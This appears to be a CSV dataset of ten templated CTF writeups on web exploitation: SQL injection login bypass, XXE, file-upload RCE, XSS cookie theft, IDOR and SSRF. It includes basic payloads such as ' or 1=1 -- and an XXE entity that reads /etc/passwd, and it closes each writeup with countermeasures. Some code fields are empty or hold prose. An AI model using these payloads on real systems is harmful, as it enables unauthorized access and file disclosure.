"filename","category","text"
"writeup_0001_tagged.txt","Web Exploitation","Title: SQL Injection in Login Form to Bypass Authentication
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: None

#context
During a CTF competition, I encountered a web application that used a login form to authenticate users. After inspecting the login form's source code, I noticed that it was vulnerable to SQL injection, a common vulnerability that allows attackers to manipulate SQL queries and execute unauthorized actions on the database.

#discovery
To test for a possible SQL injection vulnerability, I crafted an input containing malicious SQL code, such as ' or 1=1 --. If the application executed the SQL code and granted me access to the application, it would confirm the presence of a SQL injection vulnerability.

#exploitation
Upon submitting the crafted input to the login form, the web application indeed executed the SQL code and granted me access to the application, bypassing the authentication mechanism. To obtain the flag for the Web Exploitation challenge, I needed to use the SQL injection vulnerability to extract data from the database.

#code
`' or 1=1 --`

#exploitation
After crafting a suitable payload, I submitted it to the login form, which executed the SQL code and returned sensitive data, including the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of securing web applications against SQL injection vulnerabilities by validating and sanitizing user input, using prepared statements or parameterized queries, and restricting the privileges of database users. By exploiting the SQL injection vulnerability, I was able to bypass authentication, extract sensitive data, and obtain the flag needed to complete the challenge.
"
"writeup_0002_tagged.txt","Web Exploitation","Title: XXE Injection to Access Server Files
Primary topic: Web Exploitation
Secondary topic: XXE Injection
Tools used: None
Keywords: XML parsing, external entity, file system access

#context
During a CTF competition, I encountered a web application that parsed XML input and displayed the results to the user. Given the nature of XML parsing and processing, I suspected that the application might be vulnerable to XML External Entity (XXE) injection, a type of vulnerability that allows attackers to read arbitrary files on the server or execute remote requests.

#discovery
To test for XXE injection, I crafted an XML input containing a reference to an external entity, such as <!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]> <root>&xxe;</root>. If the application parsed the input and displayed the contents of the passwd file, it would confirm the presence of an XXE injection vulnerability.

#exploitation
Upon submitting the crafted input to the application, it indeed displayed the contents of the passwd file, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XXE injection vulnerability to read a specific file on the server. After crafting a suitable payload and choosing the target file, I submitted the input to the application, which executed the XXE injection and displayed the contents of the file, including the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against XXE injection vulnerabilities by validating and sanitizing XML input, disabling external entity references, and restricting file system access. By exploiting the XXE injection vulnerability, I was able to read arbitrary files on the server, extract sensitive data, and obtain the flag needed to complete the challenge.

#code
<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]> <root>&xxe;</root>
"
"writeup_0003_tagged.txt","Web Exploitation","Title: Remote Code Execution via File Upload
Primary topic: Web Exploitation
Secondary topic: Remote Code Execution
Tools used: None
Keywords: file upload, PHP web shell

#context
During a CTF competition, I encountered a web application that allowed users to upload files, such as images or documents, to the server. Given the potential security risks associated with file uploads, I suspected that the application might be vulnerable to Remote Code Execution (RCE), a type of vulnerability that allows attackers to execute arbitrary code on the server.

#discovery
To test for RCE, I crafted a malicious file containing executable code, such as a PHP web shell, and uploaded it to the server. If the application executed the code and granted me remote access to the server, it would confirm the presence of an RCE vulnerability.

#exploitation
Upon submitting the malicious file to the application, it indeed executed the code and granted me remote access to the server, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the RCE vulnerability to execute arbitrary commands on the server. After uploading a suitable payload, I executed the commands and obtained sensitive data, including the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of securing web applications against file upload vulnerabilities by validating and sanitizing file types and content, setting proper file permissions, and restricting file system access. By exploiting the RCE vulnerability, I was able to execute arbitrary commands on the server, access sensitive data, and obtain the flag needed to complete the challenge.
"
"writeup_0004_tagged.txt","Web Exploitation","Title: Cross-Site Scripting (XSS) Attack to Steal Cookies
Primary topic: Web Exploitation
Secondary topic: Cross-Site Scripting (XSS)
Tools used: None
Keywords: session cookie, user input, malicious scripts

#context
During a CTF competition, I encountered a web application that displayed user input without properly validating and sanitizing it, making it vulnerable to Cross-Site Scripting (XSS), a type of vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users.

#discovery
To test for XSS, I crafted a benign script, such as <script>alert('XSS')</script>, and submitted it to the application. If the application displayed the script and executed it in the context of another user, it would confirm the presence of an XSS vulnerability.

#exploitation
Upon submitting the crafted input to the application, it indeed displayed the script and executed it in the context of another user, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to steal the session cookie of another user. After crafting a suitable payload, I submitted it to the application, which executed the XSS attack and stole the session cookie of another user, allowing me to access their account and obtain the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against XSS vulnerabilities by validating and sanitizing user input, encoding output to prevent script injection, and using HTTP-only session cookies. By exploiting the XSS vulnerability, I was able to steal session cookies, access user accounts, and obtain the flag needed to complete the challenge.
"
"writeup_0005_tagged.txt","Web Exploitation","Title: SQL Injection in Login Form
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: SQL queries, authentication, database, payload, parameterized queries, user input, sensitive data, flag

#context
During a CTF competition, I encountered a web application that used SQL queries to authenticate users and grant access to restricted content. Given the potential security risks associated with SQL queries, I suspected that the application might be vulnerable to SQL Injection, a type of vulnerability that allows attackers to manipulate SQL queries to perform unauthorized actions on the database.

#discovery
To test for SQL Injection, I crafted a malicious input containing SQL code, such as ' OR 1=1;--, and submitted it to the application's login form. If the application allowed me to bypass authentication and gain access to restricted content, it would confirm the presence of an SQL Injection vulnerability.

#exploitation
Upon submitting the crafted input to the application, it indeed bypassed authentication and granted me access to restricted content, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the SQL Injection vulnerability to extract sensitive data from the database.

#code
' OR 1=1;--,

#exploitation
After crafting a suitable payload and choosing the target data, I submitted the input to the application, which executed the SQL Injection and displayed the sensitive data, including the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against SQL Injection vulnerabilities by using parameterized queries, validating and sanitizing user input, and restricting database access. By exploiting the SQL Injection vulnerability, I was able to manipulate SQL queries, bypass authentication, access sensitive data, and obtain the flag needed to complete the challenge.
"
"writeup_0006_tagged.txt","Web Exploitation","Title: Insecure Direct Object Reference (IDOR) Attack to Access Sensitive Data
Primary topic: Web Exploitation
Secondary topic: Insecure Direct Object Reference (IDOR)
Tools used: None
Keywords: access control, object references, input validation, sanitization

#context
During a CTF competition, I encountered a web application that displayed sensitive data without proper access control, making it vulnerable to Insecure Direct Object Reference (IDOR), a type of vulnerability that allows attackers to manipulate object references to access unauthorized data.

#discovery
To test for IDOR, I browsed the application's pages and observed the data displayed for each user. Upon noticing a pattern in the data's structure and IDs, I crafted a URL containing the ID of another user, such as http://example.com/user?id=2, and submitted it to the application. If the application displayed the sensitive data of the target user, it would confirm the presence of an IDOR vulnerability.

#exploitation
Upon submitting the crafted URL to the application, it indeed displayed the sensitive data of the target user, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the IDOR vulnerability to access the sensitive data of a privileged user. After browsing the application and identifying a privileged user, I crafted a suitable URL containing their ID and submitted it to the application, which displayed their sensitive data, including the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against IDOR vulnerabilities by enforcing proper access control, using randomized and unpredictable object references, and performing input validation and sanitization. By exploiting the IDOR vulnerability, I was able to manipulate object references, access unauthorized data, and obtain the flag needed to complete the challenge.
"
"writeup_0007_tagged.txt","Web Exploitation","Title: Remote Code Execution (RCE) Attack via File Upload
Primary topic: Web Exploitation
Secondary topic: Remote Code Execution
Tools used: None
Keywords: file upload, PHP code, web shell, payload, command execution

#context
During a CTF competition, I encountered a web application that allowed users to upload and manage files. Given the potential security risks associated with file uploads, I suspected that the application might be vulnerable to Remote Code Execution (RCE), a type of vulnerability that allows attackers to execute arbitrary code on the server.

#discovery
To test for RCE, I crafted a malicious file containing PHP code, such as a web shell, and uploaded it to the application. If the application allowed me to execute the code and obtain remote access to the server, it would confirm the presence of an RCE vulnerability.

#exploitation
Upon uploading the crafted file to the application, it indeed allowed me to execute the PHP code and obtain remote access to the server, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the RCE vulnerability to execute a specific command on the server.

#code
`After researching the server's configuration and available commands, I crafted a suitable payload containing the desired command and uploaded it to the application, which executed the command and displayed the flag for the Web Exploitation challenge.`

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against RCE vulnerabilities by validating and sanitizing user input, using file type validation and content inspection, and restricting file permissions and execution. By exploiting the RCE vulnerability, I was able to execute arbitrary code, obtain remote access to the server, and obtain the flag needed to complete the challenge.
"
"writeup_0008_tagged.txt","Web Exploitation","Title: Cross-Site Scripting (XSS) Attack via Form Input
Primary topic: Web Exploitation
Secondary topic: Cross-Site Scripting (XSS)
Tools used: None
Keywords: form input, session cookie

#context
During a CTF competition, I encountered a web application that allowed users to submit feedback through a form. Given the potential security risks associated with form input, I suspected that the application might be vulnerable to Cross-Site Scripting (XSS), a type of vulnerability that allows attackers to inject and execute malicious scripts in the user's browser.

#discovery
To test for XSS, I crafted a malicious input containing a script, such as <script>alert('XSS');</script>, and submitted it to the application's form. If the application allowed the script to execute and display the alert message, it would confirm the presence of an XSS vulnerability.

#exploitation
Upon submitting the crafted input to the application, it indeed executed the script and displayed the alert message, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to steal the user's session cookie and impersonate them. After crafting a suitable payload containing a script to steal the session cookie, I submitted it to the application's form. The script successfully executed and sent the user's session cookie to a remote server controlled by me, allowing me to impersonate the user and obtain the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against XSS vulnerabilities by validating and sanitizing user input, using content security policies, and implementing input/output encoding. By exploiting the XSS vulnerability, I was able to inject and execute malicious scripts, steal sensitive information, and obtain the flag needed to complete the challenge.

#code
<script>alert('XSS');</script>
"
"writeup_0009_tagged.txt","Web Exploitation","Title: Server-Side Request Forgery (SSRF) Attack via URL Parameter
Primary topic: Web Exploitation
Secondary topic: Server-Side Request Forgery (SSRF)
Tools used: None
Keywords: URL parameter, vulnerable server, restricted resource

#context
During a CTF competition, I encountered a web application that allowed users to fetch and display web pages by specifying a URL parameter. Given the potential security risks associated with URL parameters, I suspected that the application might be vulnerable to Server-Side Request Forgery (SSRF), a type of vulnerability that allows attackers to manipulate and send unauthorized requests from the server.

#discovery
To test for SSRF, I crafted a malicious URL containing a request to a vulnerable server, such as http://vulnerable-server.com/admin, and submitted it to the application's URL parameter. If the application allowed the request to execute and display the vulnerable server's response, it would confirm the presence of an SSRF vulnerability.

#exploitation
Upon submitting the crafted URL to the application, it indeed sent the request to the vulnerable server and displayed its response, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the SSRF vulnerability to access a restricted resource on the server.

#code
None

#exploitation
After researching the server's configuration and available resources, I crafted a suitable URL containing the desired resource and submitted it to the application's URL parameter. The server successfully executed the request and displayed the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against SSRF vulnerabilities by validating and sanitizing user input, using input/output encoding, and implementing white-listing and blacklisting techniques. By exploiting the SSRF vulnerability, I was able to manipulate and send unauthorized requests from the server, access restricted resources, and obtain the flag needed to complete the challenge.
"
"writeup_0010_tagged.txt","Web Exploitation","Title: SQL Injection in Login Functionality
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: login functionality, SQL commands, database, payload, input/output encoding

#context
During a CTF competition, I encountered a web application that allowed users to login to a protected area by submitting their credentials through a login form. Given the potential security risks associated with login functionality, I suspected that the application might be vulnerable to SQL Injection, a type of vulnerability that allows attackers to inject and execute malicious SQL commands in the application's database.

#discovery
To test for SQL Injection, I crafted a malicious input containing SQL commands, such as 1' or '1'='1, and submitted it to the application's login form. If the application allowed the input to execute and bypass the login authentication, it would confirm the presence of an SQL Injection vulnerability.

#exploitation
Upon submitting the crafted input to the application, it indeed executed the SQL command and bypassed the login authentication, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the SQL Injection vulnerability to extract sensitive information from the application's database.

#code
`1' or '1'='1`

#exploitation
After researching the database's structure and available data, I crafted a suitable payload containing SQL commands to extract the desired information and submitted it to the application's login form. The server successfully executed the commands and displayed the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against SQL Injection vulnerabilities by validating and sanitizing user input, using parameterized queries, and implementing input/output encoding. By exploiting the SQL Injection vulnerability, I was able to inject and execute malicious SQL commands, bypass authentication, extract sensitive information, and obtain the flag needed to complete the challenge.
"
